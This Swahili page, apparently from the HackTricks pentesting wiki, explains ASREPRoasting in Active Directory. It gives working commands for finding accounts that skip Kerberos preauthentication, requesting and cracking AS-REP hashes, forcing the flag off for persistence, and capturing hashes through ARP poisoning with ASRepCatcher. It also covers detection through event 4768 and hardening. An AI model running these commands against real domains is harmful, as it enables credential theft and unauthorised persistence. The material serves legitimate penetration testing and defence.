# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ni shambulio la usalama linalowalenga watumiaji wasio na sifa ya **Kerberos pre-authentication required**. Kimsingi, udhaifu huu huwawezesha washambuliaji kuomba uthibitishaji wa mtumiaji kutoka kwa Domain Controller (DC) bila kuhitaji nenosiri la mtumiaji. Kisha DC hujibu kwa ujumbe uliosimbwa kwa ufunguo uliotokana na nenosiri la mtumiaji. Washambuliaji wanaweza kujaribu kuuvunja offline ili kugundua nenosiri la mtumiaji.

Mahitaji makuu ya shambulio hili ni:

- **Kutokuwepo kwa Kerberos pre-authentication**: Watumiaji lengwa hawapaswi kuwa na kipengele hiki cha usalama kimewezeshwa.
- **Muunganisho kwa Domain Controller (DC)**: Washambuliaji wanahitaji kufikia DC ili kutuma maombi na kupokea ujumbe uliosimbwa.
- **Akaunti ya domain ya hiari**: Kuwa na akaunti ya domain huwawezesha washambuliaji kutambua kwa ufanisi zaidi watumiaji walio hatarini kupitia maswali ya LDAP. Bila akaunti kama hiyo, washambuliaji lazima wakisie majina ya watumiaji.

#### Kuhesabu watumiaji walio hatarini (kunahitaji credentials za domain)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Ombi la ujumbe wa AS_REP

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus huomba **RC4** kwa chaguo-msingi, kwa hivyo Event ID **4768** kwa kawaida huonyesha **preauth type 0** na **ticket encryption type 0x17**. Ukiongeza **`/aes`** (au RC4 imezimwa kwa lengwa), tarajia etypes za **AES** badala yake.<sup>[[2]](#references)</sup>

#### Amri fupi za mstari mmoja (Linux)

- Orodhesha kwanza malengo yanayoweza kulengwa (kwa mfano, kutoka kwenye njia za build zilizovuja) kwa kutumia Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Fanya roast kwa orodha nzima ya majina ya watumiaji bila creds halali kwa kutumia NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Ikiwa una creds, acha NetExec iulize LDAP na ikuombee akaunti zote zinazoweza kufanyiwa roast: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Ikiwa matokeo yanaanza na **`$krb5asrep$23$`**, yafungue kwa kutumia Hashcat **`-m 18200`**. Yakianza na **`$krb5asrep$17$`** au **`$krb5asrep$18$`**, pendelea John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Kufungua

Usidhani kwamba kila AS-REP roast ni RC4. Zana za kisasa zinaweza kurudisha **RC4** (`$krb5asrep$23$`) au **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), kutegemea enctype iliyoombwa/iliyokubaliwa. **`hashcat -m 18200`** ni ya **etype 23**, ilhali **John** hushughulikia `krb5asrep` moja kwa moja kwa **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Persistence

Lazimisha **preauth** isiwe lazima kwa mtumiaji ambaye una ruhusa za **GenericAll** (au ruhusa za kuandika properties):

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Ugunduzi na uimarishaji wa usalama

Ombi la **AS-REP bila preauthentication** likifaulu, huzalisha tukio la **4768** kwenye DC lenye `Status=0x0` na `PreAuthType=0`; hili hurekodi ombi, si uthibitisho kwamba mtu yeyote alipasua jibu au kuhatarisha akaunti. Usihitaji RC4 katika ugunduzi: `TicketEncryptionType=0x17` ni ishara muhimu ya usimbaji fiche dhaifu, lakini mshambuliaji anaweza kuomba AES (thamani za kumbukumbu ya matukio `0x11`/`0x12`). Kwenye Windows Server 2016 na matoleo mapya zaidi yenye sasisho limbikizi la Januari 14, 2025 (au jipya zaidi), toleo la 2 la tukio la 4768 pia huonyesha `ClientAdvertizedEncryptionTypes`, aina za etype na funguo zinazotumika na akaunti/DC.<sup>[[5]](#references)</sup>

Uchunguzi wa vitendo huweka alama kwa mteja anayetangaza RC4 pekee ilhali akaunti ina funguo za AES, kisha huhusisha maombi mengi kutoka IP chanzo kimoja kwa watumiaji kadhaa wasiohitaji preauthentication. Weka vighairi halali kwenye orodha ya msingi badala ya kutoa tahadhari kwa kila tukio la `PreAuthType=0`.

Kwa ajili ya kubaini chanzo, sanifisha sehemu ya `IpAddress` (ambayo inaweza kuwa na IPv4 iliyopangwa kwa `::ffff:`) na ulinganishe kipindi chake cha muda na matukio ya tiketi ya huduma ya 4769 au ya ufikiaji wa share ya 5140. Matukio hayo yanaweza kutaja akaunti zilizotumika kutoka anwani hiyo hiyo, lakini ombi la AS-REP lisilohitaji preauthentication halihitaji akaunti iliyothibitishwa. Vifaa vinavyotumiwa na watu wengi, NAT, proksi na vipindi vingi humaanisha kuwa kulinganisha IP **hakubaini** mtu au akaunti iliyotuma AS-REQ. Chukulia akaunti husika kama vidokezo vya uchunguzi na uthibitishe kwa ushahidi wa endpoint au mtandao.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

Suluhisho la kudumu ni kuondoa **Do not require Kerberos preauthentication** kwenye kila mtumiaji ambaye hahitaji kipengele hicho kabisa, na kubadilisha nywila za akaunti zilizoanikwa. Ikiwa haiwezekani kuondoa kighairi, tumia nywila ndefu iliyozalishwa bila mpangilio na upe akaunti ruhusa chache zaidi. Kuzima RC4 huongeza gharama ya kupasua nywila lakini hakuondoi uwezekano wa kufanya roasting, kwa kuwa majibu ya AES AS-REP bado yanaweza kupasuliwa offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast bila credentials

Mshambuliaji aliye kwenye njia anaweza kunasa AS-REP inayorejeshwa wakati wa mabadilishano ya kawaida ya AS yenye preauthentication, kisha kuumbiza sehemu yake iliyosimbwa kwa ajili ya kuipasua offline. Tofauti na ASREPRoasting ya kawaida, hii haihitaji `DONT_REQ_PREAUTH`; hata hivyo, hupata tu akaunti ambazo mabadilishano yake ya Kerberos yamenaswa. **ASRepCatcher** hupata nafasi hiyo kwa kutumia ARP poisoning ya njia moja kwa chaguo-msingi, au inaweza kutumia trafiki kutoka kwa mbinu nyingine ya MitM kwa `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Ikiwa unataka mbinu inayohusiana isiyohitaji credentials na inayorejesha **service ticket** badala ya **TGT** kutoka kwa principal isiyohitaji preauth, angalia [Kerberoast](kerberoast.md).

Katika hali ya `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) husambaza AS-REQ zilizonaswa na kulazimisha **RC4** ikiwa pande zote mbili bado zinairuhusu. `listen` haibadili pakiti, kwa hiyo hunasa enctype yoyote ambayo mteja na DC wamekubaliana kutumia. Ikiwezekana, punguza wigo wa poisoning kwa kutumia `-t`/`-tf` badala ya kulenga subnet nzima.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Tukio la 4768: Tiketi ya uthibitishaji ya Kerberos iliombwa](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Tukio la usalama 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Tukio la usalama 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
